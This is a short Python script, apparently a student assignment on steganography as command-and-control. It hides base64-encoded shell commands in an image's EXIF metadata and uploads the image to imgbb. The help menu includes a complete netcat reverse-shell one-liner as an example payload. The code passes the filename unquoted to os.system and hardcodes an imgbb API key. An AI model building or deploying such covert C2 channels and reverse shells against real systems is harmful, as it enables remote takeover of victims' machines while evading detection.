"""
Name    : Ardian Danny
NIM     : 2301847303
Kelas   : LA07
Topic   : Steganography Sebagai C&C
"""

import os
import sys
import json
import base64
import requests
from getopt import getopt


FILENAME = ''
COMMAND = ''


def help():
	print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Steganography C&C Help Menu -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
	print("-f --file 		[FILENAME]            : The file you want to inject with the command")
	print("-c --command 	[COMMAND]             : The command you want to inject to the file")
	print("-h --help                              : Print this help menu")
	print("\n\nExamples:")
	print("python3 steganography_cnc_2301847303.py -h")
	print("python3 steganography_cnc_2301847303.py -f squoge.jpg -c 'whoami'")
	print("python3 steganography_cnc_2301847303.py -f squoge.jpg -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f'")
	print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n")



def inject_command():

	print("[*] Injecting command..")

	try:
		os.system(f"exiftool -Copyright='{COMMAND}' {FILENAME}")
	except Exception as e:
		print(f"[!] Error: {e}")


	print("[+] Command injected")


def upload_to_imgbb():

	file = open(f"{FILENAME}", "rb").read()
	encoded_file = base64.b64encode(file)

	imgbb_api_key = 'cacd286b319bdc91cd1b1b57a567994c'
	url = "https://api.imgbb.com/1/upload"

	data = {
		'key': imgbb_api_key,
		'image': encoded_file
	}

	upload = requests.post(url, data=data)

	response = json.loads(upload.text)

	print(f'[+] Image uploaded on: {response["data"]["url"]}')



def main():
    
	global FILENAME, COMMAND
    
	options, _ = getopt(sys.argv[1:], "f:c:h", ["file=", "command=","help"])


	if len(options) == 0:

		help()

		print("[!] Please specify the filename and the command you want to inject")

		sys.exit()


	for key, value in options:

    
		if (key in ["-h", "--help"]):
			help()
			sys.exit()
        
		elif key in ["-f", "--file"]:  
			FILENAME = value

		elif key in ["-c", "--command"]:
			COMMAND = base64.b64encode(value.encode())
    
	inject_command()

	upload_to_imgbb()


if __name__ == "__main__":
    
	main()
